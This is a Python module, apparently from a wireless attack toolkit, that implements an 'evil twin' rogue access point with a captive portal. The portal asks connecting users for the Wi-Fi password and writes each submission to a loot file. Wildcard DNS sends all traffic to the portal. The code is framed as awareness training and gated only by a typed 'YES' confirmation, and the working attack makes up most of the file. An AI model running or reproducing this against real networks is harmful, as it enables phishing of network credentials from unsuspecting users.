import os
import sys
import time
import subprocess
import threading
from pathlib import Path
from http.server import BaseHTTPRequestHandler, HTTPServer

from core.ui import UI, C, W, R, G, B, NC, Y, D, mini_banner


class TrainingPortalHandler(BaseHTTPRequestHandler):
    """
    Simple captive portal handler for awareness training and lab simulations.

    NOTE:
    - This is designed for controlled environments only.
    - It simulates a login prompt and records submitted passwords to a lab
      loot file for review and awareness purposes.
    """

    def log_message(self, format, *args):
        # Silence default HTTP server logs
        return

    def _lab_page(self):
        """
        Render a neutral, training-focused portal.
        """
        return """
        <html>
        <head>
            <meta name="viewport"
                  content="width=device-width, initial-scale=1.0">
            <title>Network Access Check</title>
            <style>
                body {
                    font-family: sans-serif;
                    text-align: center;
                    padding: 20px;
                    background: #f2f2f2;
                }
                .box {
                    background: white;
                    padding: 30px;
                    border-radius: 10px;
                    box-shadow: 0 0 10px rgba(0,0,0,0.1);
                    max-width: 400px;
                    margin: auto;
                }
                input {
                    width: 100%;
                    padding: 10px;
                    margin: 10px 0;
                    border: 1px solid #ddd;
                    border-radius: 5px;
                }
                button {
                    width: 100%;
                    padding: 10px;
                    background: #007bff;
                    color: white;
                    border: none;
                    border-radius: 5px;
                    cursor: pointer;
                }
                .note {
                    font-size: 0.85em;
                    color: #777;
                    margin-top: 10px;
                }
            </style>
        </head>
        <body>
            <div class="box">
                <h2>Network Access Validation</h2>
                <p>
                    This is a controlled training or testing environment.
                    If instructed by your security team, please enter the
                    Wi‑Fi password used to connect to this network.
                </p>
                <form method="POST">
                    <input type="password"
                           name="pwd"
                           placeholder="Enter Wi‑Fi Password"
                           required>
                    <button>Submit for Validation</button>
                </form>
                <p class="note">
                    If you were not expecting this page, contact your
                    security or IT team.
                </p>
            </div>
        </body>
        </html>
        """

    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        self.wfile.write(self._lab_page().encode())

    def do_POST(self):
        content_length = int(self.headers.get("Content-Length", "0"))
        post_data = self.rfile.read(content_length).decode("utf-8")

        # Very simple parser: pwd=<value>
        password = None
        try:
            # Handle potential additional fields in the future
            for part in post_data.split("&"):
                if part.startswith("pwd="):
                    password = part.split("=", 1)[1]
                    break
        except Exception:
            password = None

        if password:
            password = password.replace("+", " ")  # very basic decode
            # Log to the server console
            print(f"\n{G}[+] LAB CREDENTIAL SUBMITTED: {password}{NC}")

            # Write to loot file (lab/test only)
            loot_dir = Path(getattr(self.server, "loot_dir", "loot"))
            loot_dir.mkdir(parents=True, exist_ok=True)
            loot_file = loot_dir / "lab_credentials.txt"

            try:
                with loot_file.open("a", encoding="utf-8") as f:
                    f.write(f"Submitted password: {password}\n")
            except Exception as e:
                print(f"{R}[!] Failed to write credential to loot file: {e}{NC}")

        # Redirect to a neutral page
        self.send_response(302)
        self.send_header("Location", "http://example.com")
        self.end_headers()


class EvilTwin:
    """
    Rogue AP Simulation / Captive Portal for training and validation.

    This module is intended ONLY for:
    - Controlled lab environments
    - Awareness training with informed participants
    - Explicitly authorized internal security assessments

    It should NOT be used on production networks without a defined scope,
    written authorization, and appropriate safeguards.
    """

    def __init__(self, iface, proj_dir):
        self.iface = iface
        self.path = Path(proj_dir)

    def _authorization_prompt(self):
        """
        Strong authorization reminder and confirmation prompt.
        """
        UI.print_box(
            [
                "This module starts a rogue access point simulation and",
                "a captive portal for training or validation purposes.",
                "",
                "Use ONLY in controlled lab environments or with explicit,",
                "written permission from the network owner.",
                "",
                "Misuse may violate laws and organizational policies.",
            ],
            title="AUTHORIZED USE ONLY",
        )

        confirm = input(
            f"\n{Y}Type 'YES' to confirm you are authorized "
            f"to run this in your environment: {NC}"
        ).strip()

        if confirm != "YES":
            print(f"\n{R}[!] Authorization not confirmed. Aborting module.{NC}")
            time.sleep(1.5)
            return False

        return True

    def _prepare_configs(self, ssid):
        """
        Write hostapd and dnsmasq configuration files to the project path.
        """
        hostapd_conf = f"""
interface={self.iface}
driver=nl80211
ssid={ssid}
hw_mode=g
channel=6
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
"""

        dns_conf = f"""
interface={self.iface}
dhcp-range=10.0.0.10,10.0.0.50,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
address=/#/10.0.0.1
"""

        hostapd_path = self.path / "hostapd.conf"
        dns_path = self.path / "dns.conf"

        self.path.mkdir(parents=True, exist_ok=True)

        with hostapd_path.open("w", encoding="utf-8") as f:
            f.write(hostapd_conf)

        with dns_path.open("w", encoding="utf-8") as f:
            f.write(dns_conf)

        return hostapd_path, dns_path

    def _configure_interface(self):
        """
        Bring up the interface with a static IP for the rogue AP.

        This is Linux-specific and assumes nl80211-compatible drivers.
        """
        print(f"\n{C}[*] Configuring network interface {self.iface}...{NC}")
        os.system(f"ip link set {self.iface} down")
        os.system(f"ip addr flush dev {self.iface}")
        os.system(f"ip link set {self.iface} up")
        os.system(f"ip addr add 10.0.0.1/24 dev {self.iface}")

    def _start_captive_portal(self):
        """
        Start the HTTP training portal in a background thread.
        """

        def run_server():
            server = HTTPServer(("0.0.0.0", 80), TrainingPortalHandler)
            # Attach loot directory for the handler
            server.loot_dir = self.path / "loot"
            try:
                server.serve_forever()
            except KeyboardInterrupt:
                pass

        threading.Thread(target=run_server, daemon=True).start()

    def launch(self):
        UI.banner()
        UI.print_box(
            [
                "Rogue Access Point Simulation",
                "Captive Portal for Awareness Training / Validation",
            ],
            title="ROGUE AP / TRAINING PORTAL",
        )

        if sys.platform != "linux":
            print(
                f"\n{Y}[!] This module requires Linux network drivers "
                f"(hostapd/dnsmasq).{NC}"
            )
            print(f"{D}    Feature unavailable on Windows/macOS.{NC}")
            input(f"\n{W}Press Enter to return...{NC}")
            return

        # Strong authorization gate
        if not self._authorization_prompt():
            return

        print(
            f"{Y}[!] This module may require a dedicated wireless interface "
            f"and may stop existing connections on {self.iface}.{NC}"
        )

        # Lab-safe default SSID if user presses Enter
        ssid = input(
            f"\n{B}Set Rogue SSID Name "
            f"{D}(default: LAB_TEST_AP){NC} > "
        ).strip()
        if not ssid:
            ssid = "LAB_TEST_AP"

        # 1. Configure Hostapd and Dnsmasq
        hostapd_path, dns_path = self._prepare_configs(ssid)

        # 2. Configure interface
        self._configure_interface()

        print(f"\n{C}[*] Starting training portal and access point...{NC}")

        # 3. Start captive portal HTTP server
        self._start_captive_portal()

        # 4. Start dnsmasq & hostapd
        try:
            subprocess.Popen(
                f"dnsmasq -C {dns_path} -d",
                shell=True,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )

            subprocess.run(
                f"hostapd {hostapd_path}",
                shell=True,
            )
        except KeyboardInterrupt:
            print(f"\n{Y}[!] Stopping Rogue AP simulation...{NC}")
        finally:
            print(f"\n{C}[*] Cleaning up interface state (manual review recommended).{NC}")
